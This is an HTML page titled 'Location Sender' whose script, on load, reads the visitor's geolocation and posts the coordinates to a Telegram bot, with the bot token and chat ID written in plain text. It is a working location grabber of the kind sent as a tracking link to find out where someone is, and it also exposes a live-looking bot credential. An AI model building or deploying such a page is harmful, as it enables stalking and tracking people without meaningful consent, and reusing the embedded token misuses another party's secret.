<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Location Sender</title>
</head>
<body>
  <h2>üìç Sending your location...</h2>
  <p id="status">Please wait...</p>

  <script>
    window.onload = function () {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          function (position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            const token = '7841305499:AAElwSSCBPF6-2cf_NEL3TXiK760exGM9pg';
            const chatId = '7570861617';
            const message = `üìç User Location:\nLatitude: ${lat}\nLongitude: ${lon}`;

            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({
                chat_id: chatId,
                text: message
              })
            })
            .then(response => response.json())
            .then(data => {
              if (data.ok) {
                document.getElementById('status').innerText = "‚úÖ Location sent successfully!";
              } else {
                document.getElementById('status').innerText = "‚ùå Failed to send location.";
                console.error("Telegram error:", data);
              }
            })
            .catch(error => {
              document.getElementById('status').innerText = "‚ùå Error sending location.";
              console.error("Fetch error:", error);
            });
          },
          function (error) {
            document.getElementById('status').innerText = "‚ùå Location access denied.";
            console.error("Geolocation error:", error);
          }
        );
      } else {
        document.getElementById('status').innerText = "‚ùå Geolocation not supported.";
      }
    };
  </script>
</body>
</html>
